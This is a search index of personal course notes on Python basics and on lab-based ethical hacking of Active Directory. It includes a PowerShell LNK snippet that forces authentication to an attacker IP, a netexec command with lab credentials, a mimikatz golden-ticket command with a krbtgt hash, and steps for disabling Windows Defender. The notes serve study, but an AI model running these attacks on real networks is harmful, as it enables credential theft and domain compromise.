<p>PYTHON</p> <p>```python</p>"},{"location":"5.Introduction%20to%20Python/8.%20%20Lists/#lists-have-brackets","title":"Lists - Have brackets []","text":"<p>movies = [\"When Harry Met Sally\", \"The Hangover\", \"The Perks of Being a Wallflower\", \"The Exorcist\"] print(movies[1])</p>"},{"location":"5.Introduction%20to%20Python/8.%20%20Lists/#returns-the-second-item-in-the-list-index-indices","title":"returns the second item in the list - index / indices","text":"<p>print(movies[0]) #returns the first item in the list  print(movies[1:3]) #returns the first number given until right before last number given  print(movies[1:4]) #returns all print(movies[1:]) #returns everything from number to end of list  print(movies[:1]) #everything before 1 print(movies[:2])  print(movies[-1]) #grabs last item  print(len(movies)) #counts items in list  movies.append(\"JAWS\") print(movies) #appends to end of list  movies.insert(2, \"Hustle\")  print(movies)  movies.pop() #removes last item print(movies)  movies.pop(0) #removes first item print(movies)  amber_movies = ['Just Go With It', '50 First Dates'] our_favorite_movies = movies + amber_movies print(our_favorite_movies)  grades = [[\"Bob\", 82], [\"Alice\", 90], [\"Jeff\", 73]] bobs_grade = grades[0][1]  print(bobs_grade)  grades[0][1] = 83  print(bobs_grade)```</p>"},{"location":"5.Introduction%20to%20Python/9.Tuples/","title":"9.Tuples","text":"<p>In Python, a tuple is an ordered collection of elements, similar to a list. However, unlike lists, tuples are immutable, meaning their elements cannot be modified once they are created. Here's an explanation of tuples in Python:</p> <p>Tuple Creation:</p> <p>To create a tuple, you enclose comma-separated values within parentheses\u00a0<code>( )</code>. Here's an example:</p> <p>fruits = (\"apple\", \"banana\", \"orange\")</p> <p>Tuple Access:</p> <p>You can access individual elements in a tuple using indexing, similar to lists. Indexing starts from 0 for the first element. Here are some examples:</p> <p>print(fruits[0])\u00a0 \u00a0 # Output: \"apple\" print(fruits[2])\u00a0 \u00a0 # Output: \"orange\"</p> <p>Tuple Immutability:</p> <p>Tuples are immutable, meaning you cannot modify their elements. Once a tuple is created, its values cannot be changed. For example, attempting to assign a new value to an element will result in an error. Here's an example:</p> <p>fruits[1] = \"grape\"\u00a0 \u00a0 # This will raise an error</p> <p>Tuple Operations:</p> <p>Although tuples are immutable, you can perform certain operations on them:</p> <ul> <li>Concatenation: You can use the\u00a0<code>+</code>\u00a0operator to concatenate two or more tuples.</li> <li>Length: The\u00a0<code>len()</code>\u00a0function returns the number of elements in a tuple.</li> <li>Slicing: You can extract a subtuple from a tuple using slicing.</li> </ul> <p>Here are some examples:</p> <p>fruits = (\"apple\", \"banana\", \"orange\") fruits2 = (\"grape\", \"kiwi\")</p> <p>combined = fruits + fruits2 print(combined)\u00a0 \u00a0 \u00a0 \u00a0 \u00a0# Output: (\"apple\", \"banana\", \"orange\", \"grape\", \"kiwi\")</p> <p>print(len(fruits))\u00a0 \u00a0 \u00a0 # Output: 3</p> <p>subtuple = fruits[1:3] print(subtuple)\u00a0 \u00a0 \u00a0 \u00a0 \u00a0# Output: (\"banana\", \"orange\")</p> <p>Tuples are useful in situations where you want to store a collection of values that should not be changed. They can be used to group related data elements and can also be used as keys in dictionaries. While tuples are immutable, they offer advantages such as faster performance and protection against unintentional modification.  </p> <p>PYTHON</p> <pre><code>#Tuples - Do not change, () \ngrades = (\"a\", \"b\", \"c\", \"d\", \"f\") \ngrades.pop,\n#grades.append won't work - not mutable \nprint(grades[1])\n</code></pre>"},{"location":"6.The%20Ethical%20Hacker%20Methodology/The%20Five%20Stages%20of%20Ethical%20Hacking/","title":"The Five Stages of Ethical Hacking","text":"<p>Ethical hacking, also known as penetration testing or white-hat hacking, follows a structured approach to identify and address vulnerabilities in computer systems and networks. The ethical hacking process typically involves the following five stages:</p> <p>Reconnaissance:</p> <p>The reconnaissance stage involves gathering information about the target system or network. It includes passive information gathering techniques such as searching publicly available information, browsing websites, and examining DNS records. The goal is to collect as much information as possible to understand the target and identify potential entry points.</p> <p>Scanning:</p> <p>In the scanning stage, the ethical hacker actively probes the target system or network to discover open ports, services, and vulnerabilities. Various tools and techniques are employed, such as port scanning, network mapping, and vulnerability scanning. This stage helps identify potential weaknesses that can be exploited.</p> <p>Gaining Access:</p> <p>In this stage, the ethical hacker attempts to gain unauthorized access to the target system or network. The focus is on exploiting vulnerabilities discovered during the scanning stage. Techniques such as password cracking, social engineering, and exploiting software vulnerabilities may be employed to gain access to the target system.</p> <p>Maintaining Access:</p> <p>Once access is gained, the ethical hacker aims to maintain access to the compromised system or network. This stage involves bypassing security mechanisms, setting up backdoors or remote access tools, and establishing persistent access. The objective is to mimic the actions of a real attacker and assess the potential impact of a successful compromise.</p> <p>Covering Tracks:</p> <p>In the final stage, the ethical hacker removes any traces of their activities from the target system or network. This includes deleting logs, modifying or removing files, and restoring the system to its original state. The goal is to ensure that the ethical hacking activity remains undetected, leaving no evidence of the penetration testing activity behind.</p> <p>It's important to note that ethical hacking should always be performed with proper authorization and within the bounds of the law. Ethical hackers are responsible for following strict ethical guidelines, maintaining confidentiality, and obtaining necessary permissions from the system or network owners before conducting any penetration testing activities.</p> <p></p>"},{"location":"7.Information%20Gathering%20%28Reconnaissance%29/1.Passive%20Reconnaissance%20Overview/","title":"1.Passive Reconnaissance Overview","text":"<p>we will focus on web</p>"},{"location":"7.Information%20Gathering%20%28Reconnaissance%29/10.%20Google%20Fu/","title":"10. Google Fu","text":"<p>can u found a backup page ?that have credentials ...</p>"},{"location":"7.Information%20Gathering%20%28Reconnaissance%29/12.Additional%20Learning%20%28OSINT%20Fundamentals%29/","title":"12.Additional Learning (OSINT Fundamentals)","text":"<p>watch course</p>"},{"location":"7.Information%20Gathering%20%28Reconnaissance%29/2.%20%20Identifying%20Our%20Target/","title":"2.  Identifying Our Target","text":"<p>bugcrowd website  .. where u can choose a target like tesla...</p>"},{"location":"7.Information%20Gathering%20%28Reconnaissance%29/3.%20%20Discovering%20Email%20Addresses/","title":"3.  Discovering Email Addresses","text":"<p>hunter.io phonebook.cz</p> <p>clearbit connect</p> <p>email hippo (verify email)</p> <p>forgot password ... in google</p>"},{"location":"7.Information%20Gathering%20%28Reconnaissance%29/4.%20%20Gathering%20Breached%20Credentials%20with%20Breach-Parse/","title":"4.  Gathering Breached Credentials with Breach Parse","text":"<p>tool with bash : brech-parse: https://github.com/hmaverickadams/breach-parse</p> <ul> <li>after credentials dump : credentials are in deep web then a list ..</li> <li>here a bash script is written to search for any already dump credentials .</li> <li>password staffing : u have breached email and password and trying for one email all password breached </li> </ul>"},{"location":"7.Information%20Gathering%20%28Reconnaissance%29/5.%20%20Hunting%20Breached%20Credentials%20with%20DeHashed/","title":"5.  Hunting Breached Credentials with DeHashed","text":"<p>payed website .. Dehashed.com</p>"},{"location":"7.Information%20Gathering%20%28Reconnaissance%29/6.Hunting%20Subdomains%20Part%201/","title":"6.Hunting Subdomains Part 1","text":"<p>WEB Info Gathering :</p> <pre><code>apt install sublist3r\n\nsublist3r\n\nsublist3r -d tesla.com\n</code></pre> <p>website :     crt.sh : use certificat finger-printing     %.tesla.com</p>"},{"location":"7.Information%20Gathering%20%28Reconnaissance%29/7.Hunting%20Subdomains%20Part%202/","title":"7.Hunting Subdomains Part 2","text":"<p>owasp amass : https://github.com/owasp-amass/amass</p> <ul> <li>used mostly by bug hunters </li> <li>u can find more domains .. more than any other tool</li> </ul> <p>after listing domains : may be they are not all alive so how to check if they are online ?</p> <p>by : https://github.com/tomnomnom/httprobe</p>"},{"location":"7.Information%20Gathering%20%28Reconnaissance%29/8.%20%20Identifying%20Website%20Technologies/","title":"8.  Identifying Website Technologies","text":"<p>what website is built with ??</p> <p>https://builtwith.com/</p> <p>also : wappalyzer extension : is not active osint</p> <p>in kali :  <pre><code>whatweb http://www.esi.ac.ma/\n</code></pre></p> <p>[!NOTE] MORE Tools more infos</p>"},{"location":"7.Information%20Gathering%20%28Reconnaissance%29/9.Information%20Gathering%20with%20Burp%20Suite/","title":"9.Information Gathering with Burp Suite","text":"<p>burp suite is  web proxy ; can intercept traffic</p> <p>u can see php ..</p>"},{"location":"8.Scanning%20%26%20Enumeration/1.%20%20Installing%20Kioptrix/","title":"1.  Installing Kioptrix","text":"<p>https://tcm-sec.com/kioptrix</p> <p>from vulnhub</p> <p>john TwoCows2</p>"},{"location":"8.Scanning%20%26%20Enumeration/2.Scanning%20with%20Nmap/","title":"2.Scanning with Nmap","text":"<ul> <li>ping 8.8.8.8   see my ip in kioptrix</li> <li>arp-scan -l (see machines in network in kali)</li> </ul> <p>or </p> <ul> <li> <p>netdiscover -r 192.168.57.0/24 (see all machines in network with arp)</p> </li> <li> <p>nmap can be picked up if they have good security</p> </li> <li>network mapper </li> <li>nmpa -sS (stilth scan) SYN synack RST  (reset flag: i am kidding nmap -T4(speed) -p-(all ports) -A(everything:version,OS..) ip nmap -T4(speed) -p 80,443,53 -A ip</li> </ul> <p>when udp use -p (for 1000 ports otherwise u wait forever UDP)</p> <p>find exploits of find vulnerabilities in open ports</p>"},{"location":"8.Scanning%20%26%20Enumeration/3.Enumerating%20HTTP%20and%20HTTPS%20Part%201/","title":"3.Enumerating HTTP and HTTPS Part 1","text":"<ul> <li>see port 80 open : we can access website with that ip</li> <li>info diclosure 404 error</li> <li>nikto for vulnerability scanning :     <code>nikto -h http://ip</code> XSS or XST cross site tracing &gt;? remote buffer overflow</li> </ul> <p>apache use php iis uses asp</p>"},{"location":"8.Scanning%20%26%20Enumeration/4.Enumerating%20HTTP%20and%20HTTPS%20Part%202/","title":"4.Enumerating HTTP and HTTPS Part 2","text":"<p>directory busting tools ; look for sub-directories -dirbuster -dirb -gobuster</p> <p><code>dirbuster&amp;</code> </p> <p>service/ version /subdirectories/server header ...max of info</p>"},{"location":"8.Scanning%20%26%20Enumeration/5.%20%20Enumerating%20SMB/","title":"5.  Enumerating SMB","text":"<p>SMB file share</p> <p>metasploite :  <code>msfconsole</code>exploitation framework</p> <p>search smb use ......</p> <p>info  options</p> <p>set RHOSTS ip run</p> <p>tool; <code>smbclient -L \\\\\\\\ip\\\\</code> then : <code>smbclient \\\\\\\\ip\\\\sharename</code></p>"},{"location":"8.Scanning%20%26%20Enumeration/6.%20%20Enumerating%20SSH/","title":"6.  Enumerating SSH","text":"<p>ssh ip (nothing)</p> <p>ssh 192.168.57.134 -oKexAlgorithms=+diffie-hellman-group1-shal</p> <p>ssh 192.168.57.134 -oKexAlgorithms=+diffie-hellman-group1-shal -c aes128-cbc</p>"},{"location":"8.Scanning%20%26%20Enumeration/7.%20%20Researching%20Potential%20Vulnerabilities/","title":"7.  Researching Potential Vulnerabilities","text":"<p> after enumeration find : 90,443,139 ..</p> <p>so let s start with mod ssl 2.8.4: - mod ssl 2.8.4 exploit  - .samba 2.2.1 exploit .. do same for others</p> <p></p> <p>do not have google then : </p> <p>do not be too specific 2.2.1a instaed 2.</p> <p><code>searchsploit mod ssl 2</code></p> <p>[!note] u can use google or searchsploit look for webalizer openssh2</p>"},{"location":"8.Scanning%20%26%20Enumeration/8.%20%20Our%20Notes%20So%20Far/","title":"8.  Our Notes So Far","text":""},{"location":"9.Vulnerability%20Scanning%20with%20Nessus/1.Scanning%20with%20Nessus%20Part%201/","title":"1.Scanning with Nessus Part 1","text":"<p>first install it from website then depakcage it :</p> <p></p> <p>then go browser with link kali:8834</p>"},{"location":"9.Vulnerability%20Scanning%20with%20Nessus/2.%20%20Scanning%20with%20Nessus%20Part%202/","title":"2.  Scanning with Nessus Part 2","text":"<p>nessus file to excel </p> <p></p>"},{"location":"a.Active%20directory%20overview/1.Active%20Directory%20overview/","title":"1.Active Directory overview","text":""},{"location":"a.Active%20directory%20overview/2.Physical%20Active%20Directory%20Components/","title":"2.Physical Active Directory Components","text":""},{"location":"a.Active%20directory%20overview/2.Physical%20Active%20Directory%20Components/#_1","title":"2.Physical Active Directory Components","text":"<p> - Domain controller is the head hocho (the person in charge)</p>"},{"location":"a.Active%20directory%20overview/2.Physical%20Active%20Directory%20Components/#_2","title":"2.Physical Active Directory Components","text":""},{"location":"a.Active%20directory%20overview/3.Logical%20Active%20Directory%20Components/","title":"3.Logical Active Directory Components","text":"<ul> <li>it is the blueprint or rule book : define objects that can be stored in our directory </li> <li>we have class objects(user , computer , printer) and attribute objects(explaining)</li> </ul> <p> - domain is used to group and manage objects (boundry to apply policies )</p> <p></p>"},{"location":"a.Active%20directory%20overview/3.Logical%20Active%20Directory%20Components/#-tree-is-hierarch-of-domains-parent-doamin-and-child-domains","title":"- tree is hierarch of domains (parent doamin and child domains)","text":"<p> - collection of domain trees</p> <p> - are Containers (users , groups , computers , organizational units) and set policies. - objects live within OUs</p> <p></p> <p></p>"},{"location":"b.Active%20Directory%20Lab%20Build/1.Lab%20Overview%20and%20Requirements/","title":"1.Lab Overview and Requirements","text":""},{"location":"b.Active%20Directory%20Lab%20Build/2.Lab%20Build%20-%20%28Cloud%20Alternative%29/","title":"2.Lab Build   (Cloud Alternative)","text":"<p>Ethical Hacking Lessons \u2014 Building Free Active Directory Lab in Azure -\u00a0https://kamran-bilgrami.medium.com/ethical-hacking-lessons-building-free-active-directory-lab-in-azure-6c67a7eddd7f</p>"},{"location":"b.Active%20Directory%20Lab%20Build/3.Downloading%20necessary%20ISO/","title":"3.Downloading necessary ISO","text":"<p>https://www.microsoft.com/en-us/evalcenter</p>"},{"location":"b.Active%20Directory%20Lab%20Build/4.%20%20Setting%20Up%20the%20Domain%20Controller/","title":"4.  Setting Up the Domain Controller","text":"<ul> <li>domain controller is what we choose windows server</li> <li>install AD DS (domain services)</li> <li>install certificate services (to run attacks after) to verify identity in domain controller and use LDAPS (secure protocol over LDAP(phone book))\"there is a lot of attacks by abusing CS\" <p>[!info] not forget to configure each one </p> </li> </ul>"},{"location":"b.Active%20Directory%20Lab%20Build/6.Setting%20Up%20Users%2C%20Groups%2C%20and%20Policies/","title":"6.Setting Up Users, Groups, and Policies","text":"<ul> <li>look at OUs, objects, domain policies as if we are system administrator</li> <li>I create a folder to contain only groups called \"groups\"</li> <li>I copied administrator two times : one for another user , another for SQL service to run SQL server</li> <li>in description write password is what many system administrators do</li> <li>add new user with clicking right mouse</li> <li>Create a file share</li> <li>set the service account  <pre><code>setspn -a HYDRA-DC/SQLService.MARVEL.local:60111 MARVEL\\SQLService\n</code></pre> and check and query by  <pre><code>setspn -T MARVEL.local -Q */*\n</code></pre></li> </ul> <p>[!info] service principal name 'SPN'</p> <ul> <li>set up a group policy : disable windows defender to perform attacks</li> </ul> <p>[! issue] When setting up the clients and domain controller for the AD part of the course, the current instruction to setup a GPO for turning off windows defender no longer works. </p> <p>There's another way to achieve the intended effects though: Once, while setting up the clients with the administrator account, go into the \"Virus &amp; threat protection settings\" and turn \"Tamper protection\" off (this setting would prevent gpos from changing security settings. This only needs to be done once as this setting does not change on reboot.)</p> <p>Then, instead of enabling \"Admin templates -&gt; Windows Defender Antivirus -&gt; Turn Off Windows Defender\" (which does not work anymore) at the GPO part </p> <p>Use the following two GPOs:  Enable \"Admin templates -&gt; Windows Defender Antivirus -&gt; Real-time Protection -&gt; Turn off real-time protection\" (This setting requires tamper protection to be off)  Disable \"Admin templates -&gt; Network -&gt; Network Connections -&gt; Windows Defender Firewall -&gt; Domain Profile -&gt; Protect all network connections\" </p> <p>-Now the windows real time protection and domain firewall stay disabled across reboots of the clients.</p> <p>-There is an even easier way though^^ Using dewalts pimpmyad script this (and more fixes) are already automated for you: https://github.com/Dewalt-arch/pimpmyadlab/blob/main/pimpmyadlab.ps1 (thanks @Dewalt for the help figuring this out)</p> <ul> <li>Enforce the policy</li> <li>set a static IP address</li> </ul>"},{"location":"b.Active%20Directory%20Lab%20Build/7.%20%20Joining%20Our%20Machines%20to%20the%20Domain/","title":"7.  Joining Our Machines to the Domain","text":"<ul> <li>We will work most with THEPUNISHER machine</li> <li>For both machines :<ul> <li>set DNS server with the IP of server (change adapter option )for each machine</li> <li>Join the domain by taping domain in search bar of windows </li> <li>click on users and edit <ul> <li>set up local administrators </li> <li>enable administrator </li> </ul> </li> <li>enable network</li> </ul> </li> <li>. to login locally not in the domain (.\\petterparker and H .....)</li> <li>Map network drive (share drive)</li> </ul>"},{"location":"c.Attacking%20Active%20Directory%20%3BInitial%20Attack%20Vectors/1.Introduction/","title":"1.Introduction","text":"<ul> <li>Internal pentesting can be done remotely (VPN) .</li> </ul>"},{"location":"c.Attacking%20Active%20Directory%20%3BInitial%20Attack%20Vectors/10.%20%20IPv6%20Attacks%20Overview/","title":"10.  IPv6 Attacks Overview","text":"<p>another form of realy ; it is more reliable</p> <p>who is doing dns for ipv6 ?</p> <p></p>"},{"location":"c.Attacking%20Active%20Directory%20%3BInitial%20Attack%20Vectors/12.ipv6%20attack%20defenses/","title":"12.ipv6 attack defenses","text":""},{"location":"c.Attacking%20Active%20Directory%20%3BInitial%20Attack%20Vectors/13.passback%20attack/","title":"13.passback attack","text":"<p>A Pen Tester\u2019s Guide to Printer Hacking -\u00a0https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/</p>"},{"location":"c.Attacking%20Active%20Directory%20%3BInitial%20Attack%20Vectors/14.initial%20internal%20attack%20strategy/","title":"14.initial internal attack strategy","text":""},{"location":"c.Attacking%20Active%20Directory%20%3BInitial%20Attack%20Vectors/2.%20%20LLMNR%20Poisoning%20Overview/","title":"2.  LLMNR Poisoning Overview","text":"<p>The\u00a0Link-Local Multicast Name Resolution\u00a0(LLMNR) is a protocol based on the Domain Name System (DNS) packet format that allows both IPv4 and IPv6 hosts to perform name resolution for hosts on the same local link.</p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p>"},{"location":"c.Attacking%20Active%20Directory%20%3BInitial%20Attack%20Vectors/3.Capturing%20Hashes%20with%20Responder/","title":"3.Capturing Hashes with Responder","text":"<p> - to start the capture .. (in video he entered to machine and taped in 'quick access' and add \\\\ip of the attacker to make it quick capturing) - Responder is installed by default</p>"},{"location":"c.Attacking%20Active%20Directory%20%3BInitial%20Attack%20Vectors/4.%20%20Cracking%20Our%20Captured%20Hashes/","title":"4.  Cracking Our Captured Hashes","text":"<ul> <li>cracking utilizes graphic card not CPU </li> </ul> <ul> <li>if easy , it will be found quickly . otherwise i can  use --force, -O (optimize)</li> <li>In case already cracked i can use --show</li> </ul> <p>[! Info] -for cracking u can use rockyou(600 MB) or rockyou2021(91 GB) also need combination of rule and word list by -r OneRule</p> <p>also if u already cracked it: </p>"},{"location":"c.Attacking%20Active%20Directory%20%3BInitial%20Attack%20Vectors/5.%20%20LLMNR%20Poisoning%20Mitigation/","title":"5.  LLMNR Poisoning Mitigation","text":""},{"location":"c.Attacking%20Active%20Directory%20%3BInitial%20Attack%20Vectors/6.SMB%20Relay%20Attacks%20Overview/","title":"6.SMB Relay Attacks Overview","text":""},{"location":"c.Attacking%20Active%20Directory%20%3BInitial%20Attack%20Vectors/7.%20%20SMB%20Relay%20Attacks%20Lab/","title":"7.  SMB Relay Attacks Lab","text":"<p>Link to note</p>"},{"location":"c.Attacking%20Active%20Directory%20%3BInitial%20Attack%20Vectors/8.SMB%20relay%20attack%20defenses/","title":"8.SMB relay attack defenses","text":"<p>Bob is domain admin needs to create : - login to his computer with a low privilege account - use bob-DA account (different from the local ) specifically to connect to the DC</p>"},{"location":"c.Attacking%20Active%20Directory%20%3BInitial%20Attack%20Vectors/9.Gaining%20Shell%20Access/","title":"9.Gaining Shell Access","text":"<p>you can compromise a domain without having a shell but here , when you need informations it is not a bad idea to do so . </p> <p></p>"},{"location":"d.Attacking%20Active%20Directory%20%2C%20Post-Compromise%20Enumeration/1.intro/","title":"1.intro","text":""},{"location":"d.Attacking%20Active%20Directory%20%2C%20Post-Compromise%20Enumeration/2.Domain%20Enumeration%20with%20ldapdomaindump/","title":"2.Domain Enumeration with ldapdomaindump","text":"<ul> <li>used in ipv6 relay attack , what if ipv6 disabled and i have ad user? </li> <li>then i need to learn to use ldapdomaindump</li> </ul>"},{"location":"d.Attacking%20Active%20Directory%20%2C%20Post-Compromise%20Enumeration/2.Domain%20Enumeration%20with%20ldapdomaindump/#dc-ip","title":"dc ip:","text":"<ul> <li> <p>see my high targets </p> </li> <li> <p>see old machines in machines.html file</p> </li> </ul>"},{"location":"d.Attacking%20Active%20Directory%20%2C%20Post-Compromise%20Enumeration/3.Domain%20Enumeration%20with%20Bloodhound/","title":"3.Domain Enumeration with Bloodhound","text":""},{"location":"d.Attacking%20Active%20Directory%20%2C%20Post-Compromise%20Enumeration/3.Domain%20Enumeration%20with%20Bloodhound/#required-for-bloodhound","title":"required for bloodhound","text":"<p>sudo bloodhound</p> <p>make directory run injusester :</p> <p>import that data to bloodhound , interactive </p> <p>[!note] useful : find path , tell me from people i own what i can do</p> <ul> <li>if domain admin is logged in to non domain controllers : i can do attacks : credentials dumping and tokens impersonation</li> </ul>"},{"location":"d.Attacking%20Active%20Directory%20%2C%20Post-Compromise%20Enumeration/4.Domain%20Enumeration%20with%20Plumhound/","title":"4.Domain Enumeration with Plumhound","text":"<p>Sister of bloodhound</p> <p></p> <p></p>"},{"location":"d.Attacking%20Active%20Directory%20%2C%20Post-Compromise%20Enumeration/4.Domain%20Enumeration%20with%20Plumhound/#you-need-bloodhound-and-neo4j-already-working","title":"you need bloodhound and neo4j already working:","text":"<p>plumhound takes info from bloodhound and analyze it </p> <p></p>"},{"location":"d.Attacking%20Active%20Directory%20%2C%20Post-Compromise%20Enumeration/5.%20%20Domain%20Enumeration%20with%20PingCastle/","title":"5.  Domain Enumeration with PingCastle","text":"<p>download from their platform</p>"},{"location":"e.Attacking%20Active%20Directory%2CPost-Compromise%20Attacks/1.Introduction/","title":"1.Introduction","text":"<ul> <li>how to move laterally and vertically : after i got an account , some sort of access</li> </ul>"},{"location":"e.Attacking%20Active%20Directory%2CPost-Compromise%20Attacks/10.LNK%20File%20Attacks/","title":"10.LNK File Attacks","text":"<p><pre><code>$objShell = New-Object -ComObject WScript.shell \n$lnk = $objShell.CreateShortcut(\"C:\\test.lnk\") \n$lnk.TargetPath = \"\\\\192.168.138.149\\@test.png\" \n$lnk.WindowStyle = 1 \n$lnk.IconLocation = \"%windir%\\system32\\shell32.dll, 3\" $lnk.Description = \"Test\" \n$lnk.HotKey = \"Ctrl+Alt+T\" \n$lnk.Save()\n</code></pre> Additional resources for forced authentication:\u00a0https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.rtf</p> <p>Automated attack using CME/NetExec:</p> <p>netexec smb 192.168.138.137 -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=192.168.138.149</p> <p></p> <p></p> <p>rename with a start one of thodr : @ or -- </p> <p>in file share hydra-dc : </p> <p>launch responder and reload the file share : </p> <p>to see hashes : add : -v in the responder command</p>"},{"location":"e.Attacking%20Active%20Directory%2CPost-Compromise%20Attacks/10.LNK%20File%20Attacks/#another-way","title":"another way:","text":"<p>server is attacker ip: to punisher </p>"},{"location":"e.Attacking%20Active%20Directory%2CPost-Compromise%20Attacks/11.%20%20GPP%20%2C%20cPassword%20Attacks%20and%20Mitigations/","title":"11.  GPP , cPassword Attacks and Mitigations","text":""},{"location":"e.Attacking%20Active%20Directory%2CPost-Compromise%20Attacks/12.%20%20Mimikatz%20Overview/","title":"12.  Mimikatz Overview","text":""},{"location":"e.Attacking%20Active%20Directory%2CPost-Compromise%20Attacks/13.Credential%20Dumping%20with%20Mimikatz/","title":"13.Credential Dumping with Mimikatz","text":""},{"location":"e.Attacking%20Active%20Directory%2CPost-Compromise%20Attacks/13.Credential%20Dumping%20with%20Mimikatz/#gentlekiwi","title":"gentlekiwi","text":"<p>we need debug mode : otherwise :  </p> <p>we did not see this in any other way : </p> <p>[!note] it s a powerful tool but you need obfuscation </p>"},{"location":"e.Attacking%20Active%20Directory%2CPost-Compromise%20Attacks/14.Post-Compromise%20Attack%20Strategy/","title":"14.Post Compromise Attack Strategy","text":"<p>ask : how i can move laterally until i can move vertically?</p> <p>in future : certificate attack (certipy)</p>"},{"location":"e.Attacking%20Active%20Directory%2CPost-Compromise%20Attacks/2.Pass%20Attacks%20Overview/","title":"2.Pass Attacks Overview","text":""},{"location":"e.Attacking%20Active%20Directory%2CPost-Compromise%20Attacks/2.Pass%20Attacks%20Overview/#local-security-authority","title":"local security authority","text":"<p>module lsassy : lssas is reponsible for enforcing security policy in system and also store credentials (active user in real time)  </p> <p></p>"},{"location":"e.Attacking%20Active%20Directory%2CPost-Compromise%20Attacks/3.%20%20Pass%20Attacks/","title":"3.  Pass Attacks","text":"<p>pass hash with ntlmv1 relay with ntlmv2</p> <p></p>"},{"location":"e.Attacking%20Active%20Directory%2CPost-Compromise%20Attacks/4.%20%20Dumping%20and%20Cracking%20Hashes/","title":"4.  Dumping and Cracking Hashes","text":"<p>grab any sam or cached --&gt; account user (admin or smt)</p> <p>if any of these 2 happen we can see password in clear text : - pasword in registry  - wdigest (enabled y default in win7 ,win8 2008 R2 , server 2012)</p> <p>[!info] u can enable wdigest and wait until somn loged in to se cleat text password . but not forget to disable it after in a pentesting mission</p> <p></p> <p></p>"},{"location":"e.Attacking%20Active%20Directory%2CPost-Compromise%20Attacks/4.%20%20Dumping%20and%20Cracking%20Hashes/#nt-portion-crack","title":"nt portion crack","text":""},{"location":"e.Attacking%20Active%20Directory%2CPost-Compromise%20Attacks/4.%20%20Dumping%20and%20Cracking%20Hashes/#ntlm-crack-1000","title":"ntlm crack 1000","text":""},{"location":"e.Attacking%20Active%20Directory%2CPost-Compromise%20Attacks/5.Pass%20Attack%20Mitigations/","title":"5.Pass Attack Mitigations","text":"<p> also use of LAPS of microsoft : local admin password unique for every system</p> <p>checkout : password for set sworfd of time checkin : password expire if not </p>"},{"location":"e.Attacking%20Active%20Directory%2CPost-Compromise%20Attacks/6.Kerberoasting/","title":"6.Kerberoasting","text":"<p>already seen </p>"},{"location":"e.Attacking%20Active%20Directory%2CPost-Compromise%20Attacks/7.Token%20Impersonation%20Overview/","title":"7.Token Impersonation Overview","text":"<p>token : cookies for a computer  browser has cookies to remember who you are</p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p>"},{"location":"e.Attacking%20Active%20Directory%2CPost-Compromise%20Attacks/8.%20%20Token%20Impersonation%20Walkthrough/","title":"8.  Token Impersonation Walkthrough","text":"<p>by metasploit or mimikatz</p> <p>use 4 :  </p> <p></p> <p>run</p> <p></p> <p></p> <p></p> <p></p> <p></p> <p>login as admin in punisher</p> <p></p> <p></p> <p></p> <p></p> <p>so we cloud impersonate and add user</p>"},{"location":"e.Attacking%20Active%20Directory%2CPost-Compromise%20Attacks/9.Token%20Impersonation%20Mitigation/","title":"9.Token Impersonation Mitigation","text":""},{"location":"e.Attacking%20Active%20Directory%2CPost-Compromise%20Attacks/9.Token%20Impersonation%20Mitigation/#best-practices","title":"best practices","text":""},{"location":"f.We%27ve%20Compromised%20the%20Domain%20-%20Now%20What/1.Post-Domain%20Compromise%20Attack%20Strategy/","title":"1.Post Domain Compromise Attack Strategy","text":"<p>now i have domain admin account :</p> <p></p>"},{"location":"f.We%27ve%20Compromised%20the%20Domain%20-%20Now%20What/2.Dumping%20the%20NTDS.dit/","title":"2.Dumping the NTDS.dit","text":"<p>after using exec l --&gt; data --&gt; other (column) </p> <p></p>"},{"location":"f.We%27ve%20Compromised%20the%20Domain%20-%20Now%20What/3.Golden%20Ticket%20Attacks%20Overview/","title":"3.Golden Ticket Attacks Overview","text":""},{"location":"f.We%27ve%20Compromised%20the%20Domain%20-%20Now%20What/4.Golden%20Ticket%20Attacks/","title":"4.Golden Ticket Attacks","text":"<p>ktbtgt : account that generate tickets  if i have that account ; i can be the one generating those tickets i can access any service  then i can access any machine yooooooooooooooo</p> <p></p> <p>sid and krbtgt account hash</p> <p> S-1-5-21-1205708261-1579634566-480811515 admin ntlm :7816cd5b49abcae416dff10bef04626a we need krbtgt ntlm : 660fb3a30ef73c3a23f9c8f2304089d6</p> <p> kerberos::golden /User:Administrator /domain:marvel.local /sid:S-1-5-21-1205708261-1579634566-480811515 /krbtgt:660fb3a30ef73c3a23f9c8f2304089d6 /id:500 /ppt</p> <p>for username u could put any name ptt:pass the ticket</p> <p></p>"},{"location":"f.We%27ve%20Compromised%20the%20Domain%20-%20Now%20What/4.Golden%20Ticket%20Attacks/#any-machine","title":"any machine","text":"<p> we utilizing the session with the golden ticket we just created.</p> <p></p> <p>like this :  </p>"},{"location":"f.We%27ve%20Compromised%20the%20Domain%20-%20Now%20What/4.Golden%20Ticket%20Attacks/#silver-ticket","title":"silver ticket ?","text":""},{"location":"g.Additional%20Active%20Directory%20Attacks/1.more%20initial/","title":"1.more initial","text":""},{"location":"g.Additional%20Active%20Directory%20Attacks/1.more%20initial/#u-can-check-but-sometimes-better-to-use-check-tool-instead","title":"u can check but sometimes better to use check tool instead","text":""},{"location":"g.Additional%20Active%20Directory%20Attacks/2.%20%20Abusing%20ZeroLogon/","title":"2.  Abusing ZeroLogon","text":"<p>What is ZeroLogon? -\u00a0https://www.trendmicro.com/en_us/what-is/zerologon.html</p> <p>dirkjanm CVE-2020-1472 -\u00a0https://github.com/dirkjanm/CVE-2020-1472</p> <p>SecuraBV ZeroLogon Checker -\u00a0https://github.com/SecuraBV/CVE-2020-1472</p> <p></p> <p>set dc authenticaton to null to authenticate to no password</p>"},{"location":"g.Additional%20Active%20Directory%20Attacks/2.%20%20Abusing%20ZeroLogon/#check","title":"check","text":""},{"location":"g.Additional%20Active%20Directory%20Attacks/2.%20%20Abusing%20ZeroLogon/#exploit","title":"exploit","text":""},{"location":"g.Additional%20Active%20Directory%20Attacks/2.%20%20Abusing%20ZeroLogon/#1-dump","title":"1 dump","text":""},{"location":"g.Additional%20Active%20Directory%20Attacks/2.%20%20Abusing%20ZeroLogon/#2-plain-password","title":"2 plain 